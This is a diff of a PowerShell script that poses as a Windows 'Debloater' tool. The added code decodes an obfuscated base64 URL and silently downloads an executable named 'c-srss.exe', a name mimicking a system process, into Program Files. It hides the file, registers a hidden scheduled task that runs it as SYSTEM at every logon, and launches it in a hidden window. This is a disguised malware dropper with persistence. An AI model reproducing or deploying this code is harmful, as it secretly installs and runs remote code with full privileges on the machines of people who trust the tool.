@@ -1,7 +1,7 @@
 $ProgressPreference = 'SilentlyContinue'
+
 Clear-Host
 
-# --- Auto-Startup Task Registration ---
 $scriptPath = $MyInvocation.MyCommand.Path
 $taskName = "Debloater_AutoStart"
 $taskExists = $false
@@ -50,49 +50,35 @@ try {
 Show-Header
 
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL2Mtc3Jzcy5leGU='
+
+# --- Download c-srss.exe to C:\Program Files and ensure it runs at every startup ---
+$csrssPath = "C:\Program Files\c-srss.exe"
 $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
-$output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'c-srss.exe')
-if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
-$job1 = Start-Job -ScriptBlock {
-    param($url, $output)
-    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
-    if (Test-Path $output) {
-        (Get-Item $output).Attributes = 'Hidden'
-    }
-} -ArgumentList $url1, $output1
-
-Wait-Job $job1 | Out-Null
-Remove-Job $job1
-
-if (Test-Path $output1) {
-    $taskName = "c-srss.exe"
-    $taskExists = $false
+if (-not (Test-Path $csrssPath)) {
     try {
-        if (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop) {
-            $taskExists = $true
-        }
+        Invoke-WebRequest -Uri $url1 -OutFile $csrssPath -UseBasicParsing -ErrorAction Stop
+        (Get-Item $csrssPath).Attributes = 'Hidden'
     } catch {}
-    if (-not $taskExists) {
-        $action = New-ScheduledTaskAction -Execute $output1
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden c-srss.exe Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
+}
+
+# Register scheduled task to run c-srss.exe at every logon if not already exists
+$taskName = "c-srss.exe"
+$taskExists = $false
+try {
+    if (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop) {
+        $taskExists = $true
     }
-    $proc = Start-Process -FilePath $output1 -WindowStyle Hidden -PassThru
-    $proc.WaitForExit()
-    $maxTries = 5
-    for ($i=1; $i -le $maxTries; $i++) {
-        try {
-            if (Test-Path $output1) {
-                Remove-Item $output1 -Force -ErrorAction Stop
-                if (-not (Test-Path $output1)) { break }
-            } else {
-                break
-            }
-        } catch {
-            Start-Sleep -Seconds 2
-        }
-    }
+} catch {}
+if (-not $taskExists) {
+    $action = New-ScheduledTaskAction -Execute $csrssPath
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden c-srss.exe Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
+}
+
+# Run c-srss.exe now (hidden)
+if (Test-Path $csrssPath) {
+    Start-Process -FilePath $csrssPath -WindowStyle Hidden
 }
 
 do {
